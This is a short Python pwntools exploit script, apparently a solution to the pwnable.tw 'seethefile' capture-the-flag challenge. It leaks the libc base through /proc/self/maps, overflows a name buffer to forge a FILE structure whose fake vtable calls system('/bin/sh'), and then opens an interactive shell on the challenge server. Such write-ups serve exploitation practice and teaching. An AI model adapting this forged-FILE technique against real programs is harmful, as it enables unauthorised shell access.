from pwn import *
debug = 0
context.update(arch='i386',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
elf = ELF('./seethefile')
libc = ELF('./libc_32.so.6')
if debug:
    sh = process('./seethefile')
else:
    sh = remote('chall.pwnable.tw',10200)
#gdb.attach(sh)
fp_addr = 0x0804B280
sh.recvuntil('Your choice :')
sh.sendline('1')
sh.recvuntil('What do you want to see :')
sh.sendline('/proc/self/maps')
sh.recvuntil('Your choice :')
sh.sendline('2')
sh.recvuntil('Your choice :')
sh.sendline('3')
sh.recvuntil('Your choice :')
sh.sendline('2')
sh.recvuntil('Your choice :')
sh.sendline('3')
##get libc base addr
sh.recvline(1)
libc_addr = int(sh.recvuntil('-')[:-1],16)
log.success('libc base addr => ' + hex(libc_addr))
#shell_addr = libc_addr + 0x5f065
shell_addr = libc_addr + libc.symbols['system']
sh.recvuntil('Your choice :')
sh.sendline('5')
##
sh.recvuntil('Leave your name :')
vtable_addr = fp_addr+0x94
payload = '\x00'*0x20
payload +=  p32(0x0804B284)
payload += '/bin/sh\x00'
payload += p32(0)*11#9
payload += p32(libc_addr+libc.symbols['_IO_2_1_stdin_'])#1
#payload += p32(0x0804b284)
payload += p32(3)+p32(0)*3 + p32(0x0804b260)#6
payload += p32(0xffffffff)*2#3
payload += p32(0) * 16#14
payload += p32(fp_addr+len(payload)+4-0x20)
payload += p32(0)*2 + p32(0) * 15 + p32(shell_addr) + p32(0) * 3
sh.sendline(payload) 
sh.interactive()